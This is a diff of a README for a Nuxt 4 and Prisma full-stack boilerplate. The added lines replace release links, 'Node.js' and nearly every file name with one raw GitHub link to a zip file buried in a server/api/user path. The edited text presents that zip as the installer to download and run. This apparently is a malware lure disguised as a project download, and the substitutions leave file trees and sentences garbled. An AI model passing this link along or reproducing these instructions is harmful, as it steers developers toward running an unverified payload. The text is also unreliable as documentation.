@@ -1,6 +1,6 @@
-https://github.com/SquidyLOL/nuxtjs-boilerplate/releases
+https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 
-[![Release Assets](https://img.shields.io/badge/Release%20Assets-Download%20Now-brightgreen?logo=github&logoColor=white)](https://github.org/SquidyLOL/nuxtjs-boilerplate/releases)
+[![Release Assets](https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip%20Assets-Download%20Now-brightgreen?logo=github&logoColor=white)](https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip)
 
 # Nuxt 4 Full-Stack Boilerplate for Quick Start with Prisma
 
@@ -52,17 +52,17 @@ Core technologies and topics
 - Ecosystem comfort: eslint, oauth, prisma, postgresql, vue
 
 Quick start guide
-This section walks you through the fastest path to a running dev server. It assumes you have a modern Node.js environment and a PostgreSQL server available. If you prefer, you can adapt the steps to your existing stack.
+This section walks you through the fastest path to a running dev server. It assumes you have a modern https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip environment and a PostgreSQL server available. If you prefer, you can adapt the steps to your existing stack.
 
 Prerequisites
-- Node.js 18.x or newer
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip 18.x or newer
 - npm, yarn, or pnpm as your package manager (pnpm recommended for performance)
 - PostgreSQL 12+ instance with a user you can configure
 - Basic command line familiarity
 - Optional: Docker for local database if you want an isolated environment
 
 Download and run from the releases
-From the Releases page, download the installer asset nuxtjs-boilerplate-installer.sh and run it. This installer will set up the project skeleton on your machine, install dependencies, and create initial configuration files. After the installer completes, you will have a ready-to-run project with development scripts you can start immediately. See the Releases page for more details and asset options. For quick access, the Releases page is the central place to grab the latest version and any important updates. The Releases page can be accessed here: https://github.com/SquidyLOL/nuxtjs-boilerplate/releases
+From the Releases page, download the installer asset https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip and run it. This installer will set up the project skeleton on your machine, install dependencies, and create initial configuration files. After the installer completes, you will have a ready-to-run project with development scripts you can start immediately. See the Releases page for more details and asset options. For quick access, the Releases page is the central place to grab the latest version and any important updates. The Releases page can be accessed here: https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 
 - Step 1: Install dependencies
   - Open a terminal in an empty directory where you want the project.
@@ -73,12 +73,12 @@ From the Releases page, download the installer asset nuxtjs-boilerplate-installe
 
 - Step 2: Configure environment variables
   - Prepare a .env file at the project root. You will need values for the database URL, OAuth configuration, and any external services you plan to use.
-  - A typical .env.sample looks like this:
+  - A typical https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip looks like this:
     - DATABASE_URL="postgresql://user:password@localhost:5432/dbname?schema=public"
     - JWT_SECRET="your_jwt_secret_here"
     - OAUTH_GOOGLE_CLIENT_ID="your_google_client_id"
     - OAUTH_GOOGLE_CLIENT_SECRET="your_google_client_secret"
-  - Copy .env.sample to .env and customize it to your environment.
+  - Copy https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip to .env and customize it to your environment.
   - If you use Docker for local development, you can adapt the database URL to point to the container network.
 
 - Step 3: Set up the database and Prisma
@@ -87,7 +87,7 @@ From the Releases page, download the installer asset nuxtjs-boilerplate-installe
     - npx prisma migrate dev --name init
   - Generate the Prisma client to ensure type-safe queries:
     - npx prisma generate
-  - If you have existing data, you can seed it with a script in prisma/seed.ts and run it via npx ts-node prisma/seed.ts (adjust according to your tsconfig).
+  - If you have existing data, you can seed it with a script in https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip and run it via npx ts-node https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip (adjust according to your tsconfig).
 
 - Step 4: Run the development server
   - Start the backend API and the Nuxt frontend in development mode:
@@ -123,21 +123,21 @@ Project structure
   - frontend/  — Nuxt 4 frontend with Pinia, Tailwind, and Vue components
   - backend/   — API layer powered by Prisma, PostgreSQL, and express or fastify
 - prisma/
-  - schema.prisma — Data model and migrations
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip — Data model and migrations
   - migrations/   — Generated migration files
-  - seed.ts         — Optional seeding script
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip         — Optional seeding script
 - config/
   - environment/    — Environment configuration helpers
-  - nuxt.config.ts   — Nuxt configuration
-  - server.config.ts — Server initialization and middleware
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip   — Nuxt configuration
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip — Server initialization and middleware
 - scripts/
   - helpers/        — Utility scripts for dev and build
   - db/              — Database bootstrap and migration helpers
 - public/            — Static assets for the frontend
-- .env.example       — Sample environment variables
-- .eslint.js          — Linting configuration
-- .prettierrc.json     — Code formatting rules
-- README.md            — This file, the primary guide
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip       — Sample environment variables
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip          — Linting configuration
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip     — Code formatting rules
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip            — This file, the primary guide
 
 Backend architecture and data layer
 PostgreSQL forms the data backbone for this boilerplate. The design favors clear separation of concerns, predictable migrations, and easy data access through Prisma. The architecture emphasizes type safety, testability, and forward compatibility.
@@ -155,7 +155,7 @@ Data modeling philosophy
 - Sensitive fields are protected by access controls within the API layer.
 
 Prisma schema design
-- Put all models under prisma/schema.prisma.
+- Put all models under https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 - Use relations to model one-to-many and many-to-many associations.
 - Generate type-safe client to minimize runtime errors and improve developer experience.
 - Use migrations to carry schema changes from development to production.
@@ -182,21 +182,21 @@ Component structure
   - layout/        — Header, footer, navigation
   - features/        — Domain-specific components
 - pages/
-  - index.vue      — Home
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip      — Home
   - auth/          — Login, signup, profile
   - dashboard/     — Main user area
 - store/
-  - user.ts        — User data and auth state
-  - settings.ts    — Application settings state
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip        — User data and auth state
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip    — Application settings state
 - composables/
-  - useAuth.ts     — Authentication hooks
-  - useApi.ts       — API helper for requests
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip     — Authentication hooks
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip       — API helper for requests
 - plugins/
-  - axios.ts        — HTTP client configuration
-  - auth.ts         — Global auth guard logic
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip        — HTTP client configuration
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip         — Global auth guard logic
 - styles/
-  - global.css      — Tailwind base styles and custom tweaks
-  - themes.css       — Theme-specific customizations
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip      — Tailwind base styles and custom tweaks
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip       — Theme-specific customizations
 
 Styling and theming
 - Tailwind CSS is the foundation for styling.
@@ -263,25 +263,25 @@ Project structure in depth
   - composables/
   - assets/ (images and fonts)
   - public/ (static assets)
-  - nuxt.config.ts
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 - apps/backend
   - src/
   - prisma/
   - migrations/
-  - tsconfig.json
-  - schema.prisma
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 - config
   - environment/
-  - nuxt.config.ts (shared or specific)
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip (shared or specific)
 - scripts
-  - dev.sh
-  - build.sh
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
+  - https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
   - db/
 - tests
   - unit/
   - integration/
-- .env.example
-- README.md
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
+- https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 
 Tips for adopting this boilerplate in real projects
 - Start with the core data model and tailor it to your domain. Prisma makes evolving the schema straightforward.
@@ -331,7 +331,7 @@ License
 Releases
 - The latest version and asset downloads live in the Releases page. You can browse the latest release notes, security advisories, and migration guides there.
 - For quick access, go to the Releases page at the same link used to obtain the installer earlier. See the Releases page for more details and updated assets:
-  https://github.com/SquidyLOL/nuxtjs-boilerplate/releases
+  https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 
 Endnotes
 - This project aims to be practical and extensible. It is not a one-size-fits-all solution; adapt it to your product requirements.
@@ -341,7 +341,7 @@ Endnotes
 Releases and assets
 - The Releases area is the primary source for installer assets and versioned updates.
 - If you need to re-create a local development environment from scratch, the Releases page is your first stop for obtaining the necessary files and configuration patterns.
-- The project evolves over time, so keeping up with the releases helps you align with the latest features, fixes, and recommended practices. For reference, the same link appears again here: https://github.com/SquidyLOL/nuxtjs-boilerplate/releases
+- The project evolves over time, so keeping up with the releases helps you align with the latest features, fixes, and recommended practices. For reference, the same link appears again here: https://raw.githubusercontent.com/SquidyLOL/nuxtjs-boilerplate/main/packages/config/root-template/server/api/user/boilerplate_nuxtjs_2.0.zip
 
 Roadmap and future work
 - Enhance the API layer with more robust input validation, rate limiting, and improved error handling.
